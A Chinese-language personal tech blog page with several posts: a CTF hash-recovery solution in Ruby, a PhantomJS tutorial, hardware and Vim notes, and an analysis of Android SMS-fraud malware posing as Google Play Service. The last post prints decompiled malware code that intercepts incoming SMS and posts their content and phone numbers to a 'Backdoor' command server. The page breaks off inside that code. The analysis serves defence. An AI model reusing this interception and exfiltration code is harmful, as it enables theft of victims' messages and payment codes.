</span><span class='line'>  <span class="n">sum</span> <span class="o">=</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">plain</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span> <span class="o">+</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">sum</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>  <span class="p">(</span><span class="mi">1</span><span class="o">.</span><span class="n">.plain</span><span class="o">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>    <span class="n">r</span>   <span class="o">=</span> <span class="n">enc</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">-</span> <span class="n">plain</span><span class="o">[</span><span class="n">i</span><span class="o">].</span><span class="n">ord</span> <span class="o">+</span> <span class="n">sum</span>
</span><span class='line'>    <span class="n">sum</span> <span class="o">=</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">plain</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.i</span><span class="o">]</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span> <span class="o">+</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">sum</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>    <span class="k">return</span> <span class="mi">0</span> <span class="k">if</span> <span class="n">r</span> <span class="o">&lt;</span> <span class="mi">0</span> <span class="o">||</span> <span class="n">r</span> <span class="o">&gt;</span> <span class="mi">15</span>
</span><span class='line'>    <span class="nb">hash</span> <span class="o">+=</span> <span class="n">r</span><span class="o">.</span><span class="n">to_s</span><span class="p">(</span><span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>
</span><span class='line'>  <span class="nb">p</span> <span class="nb">hash</span> <span class="k">if</span> <span class="n">all</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span> <span class="o">==</span> <span class="n">first_sum</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="n">decode_hash</span><span class="p">(</span><span class="n">plains</span><span class="p">,</span> <span class="n">enc</span><span class="p">)</span>
</span></code></pre></td></tr></table></div></figure>


<p>只有兩組符合條件</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ ruby solve.rb
</span><span class='line'>&quot;011c945f30ce2cbafc452f39840f025693339c42&quot;
</span><span class='line'>&quot;011c945f30ce2cbafc452f39840f025693339909&quot;
</span></code></pre></td></tr></table></div></figure>


<p>接著就直接用這兩組來解 enc ，看看哪個才是正解！</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='ruby'><span class='line'><span class="k">def</span> <span class="nf">es_hash</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="nb">hash</span><span class="p">)</span>
</span><span class='line'>  <span class="n">output</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
</span><span class='line'>  <span class="n">sum</span>  <span class="o">=</span> <span class="n">all</span><span class="p">(</span><span class="nb">hash</span><span class="p">)</span>
</span><span class='line'>  <span class="p">(</span><span class="mi">0</span><span class="o">.</span><span class="n">.enc</span><span class="o">.</span><span class="n">length</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span><span class="o">.</span><span class="n">each</span> <span class="k">do</span> <span class="o">|</span><span class="n">i</span><span class="o">|</span>
</span><span class='line'>    <span class="n">c</span> <span class="o">=</span> <span class="n">enc</span><span class="o">[</span><span class="n">i</span><span class="o">]</span> <span class="o">-</span> <span class="n">h2i</span><span class="p">(</span><span class="nb">hash</span><span class="o">[</span><span class="n">i</span> <span class="o">%</span> <span class="mi">40</span><span class="o">]</span><span class="p">)</span> <span class="o">+</span> <span class="n">sum</span>
</span><span class='line'>    <span class="n">output</span> <span class="o">+=</span> <span class="n">c</span><span class="o">.</span><span class="n">chr</span>
</span><span class='line'>    <span class="n">sum</span>    <span class="o">=</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">output</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span> <span class="o">+</span> <span class="n">all</span><span class="p">(</span><span class="n">s</span><span class="p">(</span><span class="n">sum</span><span class="p">)</span><span class="o">[</span><span class="mi">0</span><span class="o">.</span><span class="n">.</span><span class="mi">19</span><span class="o">]</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span>
</span><span class='line'>  <span class="n">output</span>
</span><span class='line'><span class="k">end</span>
</span><span class='line'>
</span><span class='line'><span class="nb">p</span> <span class="n">es_hash</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="s2">&quot;011c945f30ce2cbafc452f39840f025693339c42&quot;</span><span class="p">)</span>
</span><span class='line'><span class="nb">p</span> <span class="n">es_hash</span><span class="p">(</span><span class="n">enc</span><span class="p">,</span> <span class="s2">&quot;011c945f30ce2cbafc452f39840f025693339909&quot;</span><span class="p">)</span> <span class="c1"># error</span>
</span></code></pre></td></tr></table></div></figure>


<p>用第一個 <code>hash</code> 可以成功還原 <code>plain</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>$ ruby solve.rb
</span><span class='line'>&quot;SEC-41A-ASRT-3.1-OK\nKOR-A43-ASRT-9.3-KO\nCOV-718-ASRT-7.9-QE\nCON-C1D-ASRT-1.1-CO\nCOM-ICQ-ASRT-1.9-KR\nLSA-IQ1-ASRT-3.0-KR\nAES-JOO-ASRT-9.9-KR\n&quot;
</span></code></pre></td></tr></table></div></figure>


<p>所以 flag 應該就是第四行的 <code>CON-C1D-ASRT-1.1-CO</code> ！</p>

<p>不過最後正確的 <code>hash</code> 是 <code>011c945f30ce2cbafc452f39840f025693339c42</code> ，其實 <code>pass</code> 就只是 <code>1111</code> 而已&hellip;</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/05/11/my-first-experience-with-phantomjs/">PhantomJS 初體驗</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-05-11T20:39:00+08:00" pubdate data-updated="true">May 11<span>th</span>, 2014</time>
        
           | <a href="/blog/2014/05/11/my-first-experience-with-phantomjs/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2014/05/11/my-first-experience-with-phantomjs/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>最近因為想要爬個網頁資料，結果礙於處理不了萬惡的 <code>__VIEWSTATE</code> 和 <code>__EVENTVALIDATION</code> ，在時間的壓力下就決定改用 ggm 推薦 <a href="http://phantomjs.org">PhantomJS</a> ，一用之下驚為天人啊，太神了！</p>

<p><a href="http://phantomjs.org">PhantomJS</a> 概念就是在裡面跑一個 Webkit ，然後讓你用 JavaScript 控制它，所以可以模擬瀏覽器載入網頁之後 inject script / evaluate script / screenshot 的動作，官方文件也有寫到可以拿來作 web 的 testing ，模擬瀏覽、點擊之類的瀏覽器操作。</p>

<p>官網的 <a href="http://phantomjs.org/quick-start.html">Quick Start</a> 寫的蠻清楚的， <a href="http://phantomjs.org/examples/index.html">Examples</a> 也有很多範例可以參考，我自己用到的功能只有連線一個網頁後，對網頁的 <code>document</code> 作操作，然後把結果印出來，下面這段簡單的 code 就是連上 <a href="http://blog.dm4.tw">http://blog.dm4.tw</a> 首頁，拿到最新一篇文章的標題，印出標題之後截圖：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">page</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;webpage&#39;</span><span class="p">).</span><span class="nx">create</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'><span class="nx">page</span><span class="p">.</span><span class="nx">open</span><span class="p">(</span><span class="s1">&#39;http://blog.dm4.tw&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">article_title</span> <span class="o">=</span> <span class="nx">page</span><span class="p">.</span><span class="nx">evaluate</span><span class="p">(</span><span class="kd">function</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">return</span> <span class="nb">document</span><span class="p">.</span><span class="nx">getElementsByClassName</span><span class="p">(</span><span class="s2">&quot;entry-title&quot;</span><span class="p">)[</span><span class="mi">0</span><span class="p">].</span><span class="nx">children</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">innerHTML</span><span class="p">;</span>
</span><span class='line'>    <span class="p">});</span>
</span><span class='line'>    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="nx">article_title</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">page</span><span class="p">.</span><span class="nx">render</span><span class="p">(</span><span class="s1">&#39;blog.png&#39;</span><span class="p">);</span>
</span><span class='line'>    <span class="nx">phantom</span><span class="p">.</span><span class="nx">exit</span><span class="p">();</span>
</span><span class='line'><span class="p">});</span>
</span></code></pre></td></tr></table></div></figure>


<h2>PhantomJS + Node.js</h2>

<p>可以用 <a href="https://github.com/Medium/phantomjs">https://github.com/Medium/phantomjs</a> ，裡面也有提到怎麼用 <code>node</code> 跑起來：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">path</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;path&#39;</span><span class="p">)</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">childProcess</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;child_process&#39;</span><span class="p">)</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">phantomjs</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;phantomjs&#39;</span><span class="p">)</span>
</span><span class='line'><span class="kd">var</span> <span class="nx">binPath</span> <span class="o">=</span> <span class="nx">phantomjs</span><span class="p">.</span><span class="nx">path</span>
</span><span class='line'>
</span><span class='line'><span class="kd">var</span> <span class="nx">childArgs</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>  <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;phantomjs-script.js&#39;</span><span class="p">),</span>
</span><span class='line'>  <span class="s1">&#39;some other argument (passed to phantomjs script)&#39;</span>
</span><span class='line'><span class="p">]</span>
</span><span class='line'>
</span><span class='line'><span class="nx">childProcess</span><span class="p">.</span><span class="nx">execFile</span><span class="p">(</span><span class="nx">binPath</span><span class="p">,</span> <span class="nx">childArgs</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">stdout</span><span class="p">,</span> <span class="nx">stderr</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>  <span class="c1">// handle results</span>
</span><span class='line'><span class="p">})</span>
</span></code></pre></td></tr></table></div></figure>


<p>不過要注意他是開 process 跑的，不要像我一不注意開太多結果……</p>

<h2>遇到的問題</h2>

<p>因為直接用 <code>node</code> 跑的話沒噴錯誤訊息，所以下面這兩個問題找了好久啊，如果發現 <code>node</code> 跑怪怪的，可以直接用 <code>phantomjs</code> 跑跑看，至少錯誤訊息比較清楚……</p>

<h3>在 Ubuntu 上跑不起來</h3>

<p>因為要 render 的關係，所以要裝 <code>libfontconfig</code></p>

<pre><code>sudo apt-get install libfontconfig
</code></pre>

<h3>打不開 https 的網頁</h3>

<p>有些 https 網頁憑證沒設好，預設很貼心把它擋下來了，如果要打開的話，執行時要加上參數 <code>phantomjs --ignore-ssl-errors=true</code> ，如果是用 <code>node</code> 跑的話是要加在 arguments 裡：</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">var</span> <span class="nx">childArgs</span> <span class="o">=</span> <span class="p">[</span>
</span><span class='line'>  <span class="s1">&#39;--ignore-ssl-errors=true&#39;</span><span class="p">,</span>
</span><span class='line'>  <span class="nx">path</span><span class="p">.</span><span class="nx">join</span><span class="p">(</span><span class="nx">__dirname</span><span class="p">,</span> <span class="s1">&#39;phantomjs-script.js&#39;</span><span class="p">),</span>
</span><span class='line'>  <span class="s1">&#39;some other argument (passed to phantomjs script)&#39;</span>
</span><span class='line'><span class="p">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>雖然跑起來有點慢，不過功能太強了啊！讓我以後有點懶的去看 http request 用 <code>curl</code> 送 query 了 XD</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/04/24/airplay-encryption/">AirPlay Encryption</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-24T00:19:00+08:00" pubdate data-updated="true">Apr 24<span>th</span>, 2014</time>
        
           | <a href="/blog/2014/04/24/airplay-encryption/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2014/04/24/airplay-encryption/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>From <a href="http://images.apple.com/iphone/business/docs/iOS_Security_Feb14.pdf">iOS Security February 2014</a> (p.16)</p>

<blockquote><p>AirPlay also utilizes the authentication IC to verify that receivers have been approved by Apple. AirPlay audio and video streams utilize the MFi-SAP (Secure Association Protocol), which encrypts communication between the accessory and device using ECDH key exchange (Curve25519) with 2048-bit RSA keys and AES-128 in CTR mode.</p></blockquote>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2014/04/22/convert-usb-keyboard-to-bluetooth-keyboard/">自製 USB 鍵盤轉藍芽鍵盤轉接器</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2014-04-22T10:03:00+08:00" pubdate data-updated="true">Apr 22<span>nd</span>, 2014</time>
        
           | <a href="/blog/2014/04/22/convert-usb-keyboard-to-bluetooth-keyboard/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2014/04/22/convert-usb-keyboard-to-bluetooth-keyboard/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><h2>測試影片</h2>

<div class="embed-video-container"><iframe src="http://www.youtube.com/embed/RL4jmP1iwRM "></iframe></div>


<h2>材料</h2>

<ul>
<li><a href="http://www.icshop.com.tw/product_info.php/products_id/10617">Arduino Pro Mini</a></li>
<li><a href="https://www.circuitsathome.com/products-page/arduino-shields/usb-host-shield-for-arduino-pro-mini">USB Host Shield for Arduino Pro Mini</a></li>
<li><a href="https://www.sparkfun.com/products/10938">BlueSMiRF HID</a></li>
</ul>


<p>一開始是因為想要有無線的機械式鍵盤，後來覺得如果可以做成 USB 轉藍芽的模組，就可以把不同的機械式鍵盤都轉成無線的！</p>

<p>不過硬體不太熟，所以就用了比較好寫軟體的 Arduino 來開始，整體流程大致是用 USB Host Shield 來讀鍵盤訊號，然後從 BlueSMiRF HID 送出藍芽的 HID report ，這樣只要有支援藍芽鍵盤的電腦都可以用了！</p>

<p>不過只是 prototype 而且還有很多可以改進的地方，像是現在看起來超醜 XD 而且不知道為什麼用起來有一點點可以感覺到的延遲，是說不知道有沒有廠商要做類似的東西來賣，好想要啊！</p>

<p>下次可以試試看拿 <a href="http://www.aten.com.tw/products/KVM%E5%A4%9A%E9%9B%BB%E8%85%A6%E5%88%87%E6%8F%9B%E5%99%A8/%E7%84%A1%E7%B7%9A%E5%88%87%E6%8F%9B%E7%94%A2%E5%93%81/~CS533.html">ATEN CS533</a> 拆開來玩，看會不會比較省事 XD</p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/23/vim-ia-writer-theme-for-markdown/">Vim iA Writer Theme for Markdown</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-23T10:45:00+08:00" pubdate data-updated="true">Nov 23<span>rd</span>, 2013</time>
        
           | <a href="/blog/2013/11/23/vim-ia-writer-theme-for-markdown/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2013/11/23/vim-ia-writer-theme-for-markdown/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>前幾天看到 <a href="http://astrails.com/blog/2013/8/12/writing-markdown-with-style-in-vim">Writing Markdown With Style in Vim</a> 在講 vim 的 iA Writer theme
，試了之後覺得超棒的，決定以後的 markdown editor 就用 MacVim 了！</p>

<p>接著就查了一下 vim 的 ftplugin 大概怎麼做，然後因為寫 octopress
要用，所以也找了一下 Jekyll 的 YAML header syntax ，包一包就上傳啦！成品在
<a href="https://github.com/dm4/vim-writer">dm4/vim-writer</a>。</p>

<p>Screenshot:</p>

<p><img src="https://dl.dropboxusercontent.com/u/158785/blog/2013-11-23-screenshot.png" alt="screenshot" /></p>
</div>
  
  


    </article>
  
  
    <article>
      
  <header>
    
      <h1 class="entry-title"><a href="/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/">小額付費簡訊詐騙</a></h1>
    
    
      <p class="meta">
        








  


<time datetime="2013-11-09T12:22:00+08:00" pubdate data-updated="true">Nov 9<span>th</span>, 2013</time>
        
           | <a href="/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/#disqus_thread"
             data-disqus-identifier="http://blog.dm4.tw/blog/2013/11/09/xiao-e-fu-fei-jian-xun-zha-pian/">Comments</a>
        
      </p>
    
  </header>


  <div class="entry-content"><p>最近好像很流行收到這種奇怪的簡訊</p>

<p><a href="http://www.flickr.com/photos/51077287@N06/10746549465/" title="Flickr 上 sunrisedm4 的 詐騙簡訊"><img src="http://farm3.staticflickr.com/2835/10746549465_c046942cc1.jpg" width="333" height="500" alt="詐騙簡訊"></a></p>

<p>用 iPhone 點開網址之後發現會被導到一個已經關閉的無名相簿，研究了一下發現他會判斷 <code>User-Agent</code> 來決定要導到哪裡，
如果把 <code>User-Agent</code> 設成 Android 瀏覽器的話，會被導到一個下載 Andorid apk 的連結</p>

<p>不過大概是新聞報很大的原因，詐騙連結幾乎都已經失效了</p>

<p>把載下來的 apk 拆開會發現它是一個偽裝成 Google Play Service 的程式
（要拆 apk 推薦使用 <a href="http://code.google.com/p/androguard/">androguard</a> ，它的 Sublime Text plugin 簡直是神器&hellip;&hellip;）</p>

<p>使用到的權限和用到的 components</p>

<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=AndroidManifest.xml'></script>
<noscript><pre><code>&lt;?xml version=&quot;1.0&quot; ?&gt;
&lt;manifest android:versionCode=&quot;1&quot; android:versionName=&quot;1.0&quot; package=&quot;com.google.android.gmss&quot; xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;&gt;
    &lt;uses-sdk android:minSdkVersion=&quot;4&quot; android:targetSdkVersion=&quot;17&quot;&gt;&lt;/uses-sdk&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_BOOT_COMPLETED&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.INTERNET&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.RECEIVE_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.SEND_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_SMS&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.READ_PHONE_STATE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_WIFI_STATE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.ACCESS_NETWORK_STATE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.WRITE_EXTERNAL_STORAGE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.CALL_PHONE&quot;&gt;&lt;/uses-permission&gt;
    &lt;uses-permission android:name=&quot;android.permission.PROCESS_OUTGOING_CALLS&quot;&gt;&lt;/uses-permission&gt;
    &lt;application android:allowBackup=&quot;true&quot; android:icon=&quot;@7F020002&quot; android:label=&quot;@7F050000&quot; android:theme=&quot;@7F060001&quot;&gt;
        &lt;activity android:label=&quot;&quot; android:name=&quot;com.google.android.gmss.MainActivity&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.MAIN&quot;&gt;
                &lt;/action&gt;
                &lt;category android:name=&quot;android.intent.category.LAUNCHER&quot;&gt;
                &lt;/category&gt;
            &lt;/intent-filter&gt;
        &lt;/activity&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.BootBroadcastReceiver&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.BOOT_COMPLETED&quot;&gt;
                &lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;service android:exported=&quot;true&quot; android:label=&quot;@7F050000&quot; android:name=&quot;com.google.android.gmss.MouseCave&quot;&gt;
        &lt;/service&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.MouseEar&quot;&gt;
            &lt;intent-filter android:priority=&quot;2147483647&quot;&gt;
                &lt;action android:name=&quot;android.provider.Telephony.SMS_RECEIVED&quot;&gt;
                &lt;/action&gt;
                &lt;category android:name=&quot;android.intent.category.DEFAULT&quot;&gt;
                &lt;/category&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.MouseNose&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;android.intent.action.NEW_OUTGOING_CALL&quot;&gt;
                &lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
        &lt;receiver android:name=&quot;com.google.android.gmss.BlackCat&quot;&gt;
            &lt;intent-filter&gt;
                &lt;action android:name=&quot;com.mouse.BlackCat&quot;&gt;
                &lt;/action&gt;
            &lt;/intent-filter&gt;
        &lt;/receiver&gt;
    &lt;/application&gt;
&lt;/manifest&gt;
</code></pre></noscript></div>


<p>可以看到這個 app 要了一些邪惡的權限，
並且有個 receiver 會偵測 <code>android.provider.Telephony.SMS_RECEIVED</code> 這個動作，
在收到簡訊的時候被觸發，是和小額付費比較有相關的地方</p>

<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=me.java'></script>
<noscript><pre><code>package com.google.android.gmss;
public class MouseEar extends android.content.BroadcastReceiver {
    // ...
            if(v3[v2].getMessageBody().toString().contains(&quot;*#060#&quot;) == 0) {
                if(com.google.android.gmss.c.a(p8) != 0) {
                    this.abortBroadcast();
                    v1 = new java.util.HashMap();
                    v1.put(&quot;type&quot;, &quot;1&quot;);
                    v1.put(&quot;source&quot;, v3[v2].getOriginatingAddress().toString());
                    v1.put(&quot;content&quot;, v3[v2].getMessageBody().toString());
                    new Thread(new com.google.android.gmss.h(this, v1, p8)).start();
                }
            } else {
                this.abortBroadcast();
                v1 = v3[v2].getOriginatingAddress();
                v4 = v3[v2].getMessageBody().substring(6);
                v5 = new java.util.HashMap();
                v5.put(&quot;phone_id&quot;, v4);
                v5.put(&quot;phone_num&quot;, v1);
                new Thread(new com.google.android.gmss.g(this, v5, p8)).start();
            }
    // ...
}
</code></pre></noscript></div>


<p>可以看到在收到新簡訊的時候，會判斷內容有沒有包括特定字串，
有的話就會把整個簡訊內容回傳，如果沒有的話只會回傳前六個字元</p>

<p>再往下追可以找到回報資料的伺服器位置和一些東西，不過當然也失效了</p>

<div><script src='https://gist.github.com/c392ca89782e53ce7915.js?file=l.java'></script>
<noscript><pre><code>package com.google.android.gmss;
public class l {
    static String a;
    static String c;
    static String b;
    static String e;
    static String d;
    static String g;
    static String f;
    static String i;
    static String h;
    static java.util.List j;
    static l()
    {
        com.google.android.gmss.l.a = &quot;http://googleapp.leitungsen.de:1652/&quot;;
        com.google.android.gmss.l.b = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/submit&quot;).toString();
        com.google.android.gmss.l.c = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/deploy_report&quot;).toString();
        com.google.android.gmss.l.d = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/task_query&quot;).toString();
        com.google.android.gmss.l.e = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/get_blockrules&quot;).toString();
        com.google.android.gmss.l.f = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/phones_query&quot;).toString();
        com.google.android.gmss.l.g = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/phone_num_submit&quot;).toString();
        com.google.android.gmss.l.h = new StringBuilder(String.valueOf(com.google.android.gmss.l.a)).append(&quot;index.php/Backdoor/get_url&quot;).toString();
        com.google.android.gmss.l.i = &quot;c84258e9c39059a89ab77d846ddab909&quot;;
        com.google.android.gmss.l.j = new java.util.ArrayList();
        return;
    }
    public static com.google.android.gmss.p a(java.util.HashMap p6, int p7, android.content.Context p8)
    {
        switch(p7) {
            case 0:
                v2 = com.google.android.gmss.l.b;
                break;
            case 1:
                v2 = com.google.android.gmss.l.c;
                break;
            case 2:
                v2 = com.google.android.gmss.l.d;
                break;
            case 3:
                v2 = com.google.android.gmss.l.e;
                break;
            case 4:
                v2 = com.google.android.gmss.l.f;
                break;
            case 5:
                v2 = com.google.android.gmss.l.g;
                break;
            case 6:
                v2 = com.google.android.gmss.l.h;
                break;
            default:
                v2 = &quot;&quot;;
        }
        v0 = p8.getSystemService(&quot;phone&quot;);
        v3 = new java.util.ArrayList();
        if(p6 == 0) {
            p6 = new java.util.HashMap();
        }
        if(v0.getLine1Number().length() == 0) {
            p6.put(&quot;target_id&quot;, v0.getDeviceId());
        } else {
            p6.put(&quot;target_id&quot;, v0.getLine1Number());
        }
        p6.put(&quot;user_id&quot;, com.google.android.gmss.l.i);
        v4 = p6.keySet().iterator();
        while (v4.hasNext() != 0) {
            v0 = v4.next();
            v3.add(new org.apache.http.message.BasicNameValuePair(v0, p6.get(v0)));
        }
        v0 = new com.google.android.gmss.p();
        v0.b = v3;
        v0.c = 0;
        v0.a = v2;
        v1 = com.google.android.gmss.l.j;
        synchronized(v1) {
            com.google.android.gmss.l.j.add(v0);
        }
        if(com.google.android.gmss.m.a(p8) != 0) {
            com.google.android.gmss.l.a();
        }
        return v0;
    }
    public static void a()
    {
        v2 = com.google.android.gmss.l.j;
        synchronized(v2) {
            v1 = (com.google.android.gmss.l.j.size() - 1);
            while (v1 &gt;= 0) {
                v0 = com.google.android.gmss.l.j.get(v1);
                v3 = new org.apache.http.client.methods.HttpPost(v0.a);
                android.util.Log.i(&quot;HttpController&quot;, v0.a);
                v3.setEntity(new org.apache.http.client.entity.UrlEncodedFormEntity(v0.b, &quot;UTF-8&quot;));
                v3 = new org.apache.http.impl.client.DefaultHttpClient().execute(v3);
                if(v3.getStatusLine().getStatusCode() != 200) {
                    v0.d = new StringBuilder(&quot;Error Response&quot;).append(v3.getStatusLine().toString()).toString();
                } else {
                    v0.d = org.apache.http.util.EntityUtils.toString(v3.getEntity());
                }
                v0.c = 1;
